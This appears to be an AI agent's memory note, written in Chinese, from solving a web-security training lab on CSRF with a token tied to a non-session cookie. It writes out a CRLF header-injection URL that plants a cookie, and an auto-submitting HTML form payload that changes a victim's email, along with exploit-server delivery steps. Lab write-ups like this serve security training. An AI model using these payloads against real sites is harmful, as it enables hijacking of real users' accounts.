---
metadata:
  node_type: memory
name: "PRS arm A lab-token-tied-to-non-session-cookie"
description: "arm A 基线:lab-token-tied-to-non-session-cookie 冷实例一次通过 - 搜索参数 CRLF 注 csrfKey + 同 key 的 token 组成 CSRF 链"
last_updated: 2026-10-09T07:24:27+08:00
created: 2026-10-09T07:24:27+08:00
---

### 2026-10-09 arm A baseline — lab-token-tied-to-non-session-cookie

题名: CSRF where token is tied to non-session cookie (access-control 域, CSRF 族)。
结果: 冷实例 (reused:false) 一次通过, banner_verdict solved:true + "Congratulations, you solved the lab!"。
实例: https://0ae300e00327641a80ba033900a000b5.web-security-academy.net/ (exploit server https://exploit-0af00043031464688061028f019d0089.exploit-server.net/)。

链路:
1. range_launch launch-url 直取实例;注意其信封 exploit_server=null 是**假阴性** —— 本题确有 exploit server,登录页/首页横幅里印着 Go to exploit server 按钮。
2. 搜索面在 `GET /?search=`(首页 form action=/, 参数 search);`/search?search=` 是 404 JSON,勿走错。
3. CRLF 注 cookie 实证: `/?search=x%0d%0aSet-Cookie:%20csrfKey=<K>;%20SameSite=None`
   响应头出现 `set-cookie: LastSearchTerm=x` 与 `csrfKey=<K>; SameSite=None; Secure; HttpOnly`。
   无 session cookie 时该响应还会补发一条新匿名 session;带 session 时不变 ⇒ 不伤受害者会话。
4. csrf token 只是 csrfKey 的函数:同一 csrfKey 下 GET /login 页里的 token 与 /my-account/change-email 表单里
   的 token 完全相同 (实测 nhIuyzSG4k7utB4iDXqII8MkcZ3ELHHk),与 session 无关 ⇒ 从一个 GET /login 响应即可
   同时拿到配对的 (csrfKey, token)。
5. 载荷 (存 exploit server /exploit):
   `<img src="https://LAB/?search=xyz%0d%0aSet-Cookie:%20csrfKey=<K>;%20SameSite=None"
     onerror="document.forms[0].submit()">`
   `<form action="https://LAB/my-account/change-email" method="POST">
     <input type=hidden name=email value=hacker@evil-user.net>
     <input type=hidden name=csrf value=<T></form>`
   img 先落 csrfKey,onerror 再自动提交表单改受害者邮箱。
6. exploit server 存储/投递: POST / 带 urlIsHttps=on, responseFile=/exploit,
   responseHead 多行, responseBody=载荷, formAction=STORE / DELIVER_TO_VICTIM;
   DELIVER_TO_VICTIM 回 302 到 `/deliver-to-victim`,必须再 GET 该路径才真投递,
   且该 GET 的响应体本身就带 is-solved。

坑: range_launch 的 exploit_server 扫描不可信 (本题误报 null);真实存在。HTTP 全走件。

